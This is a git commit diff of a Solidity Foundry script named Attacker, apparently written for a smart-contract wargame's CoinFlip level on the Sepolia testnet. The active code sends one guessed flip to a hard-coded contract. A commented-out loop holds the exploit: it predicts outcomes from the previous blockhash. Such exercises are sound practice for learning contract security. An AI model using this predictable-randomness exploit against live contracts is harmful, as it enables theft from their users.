3c9222398021c6a8b3fa98b711310027d628835f
RicardoMuchacho <ricardojrmuchacho@gmail.com>
2025-05-31 20:34:51 +0200

    flip script successful

--- Level4/attacker.s.sol
+++ Level4/attacker.s.sol
@@ -4,15 +4,43 @@ pragma solidity >=0.8.24;
 
 import {Script} from "forge-std/Script.sol";
 import {CoinFlip} from "./Fallout.sol";
+import {console} from "forge-std/Test.sol";
 
-contract CoinFlipAttack is Script {
+interface ICoinFlip {
+   function consecutiveWins() external view returns (uint256);
+   function flip(bool _guess) external returns (bool);
+}
+
+contract Attacker is Script {
+    address public target = 0x6e964a4A8cCfd0e3c598c2cBEeB55f0c7bA6342d;
+    string SEPOLIA_RPC = "wss://sepolia.drpc.org";
+    uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
     function run() external {
-        // uint256 privateKey = vm.envUint("PRIVATE_KEY");
-        // vm.startBroadcast(privateKey);
+        uint256 privateKey = vm.envUint("PRIVATE_KEY");
+        vm.createSelectFork(SEPOLIA_RPC);
 
-        // Marketplace marketplace = new Marketplace();
-        // vm.stopBroadcast();
+       ICoinFlip coinflip = ICoinFlip(target);
 
-        // return marketplace;
+        vm.startBroadcast(privateKey);
+      
+        bool res = coinflip.flip(true);
+        console.log("Flip result:", res);
+
+        // uint256 flips = 10;
+
+        // for (uint256 i = 0; i < flips; i++) {
+        //   uint256 blockValue = uint256(blockhash(block.number - 1));
+        //   uint256 res = blockValue / Factor;
+        //   if(res == 1) {
+        //     coinflip.flip(true);   
+        //   } else {
+        //     coinflip.flip(false);   
+        //   }
+        //   vm.roll(block.number + 1);
+        // }
+
+
+        vm.stopBroadcast();
     }
 }
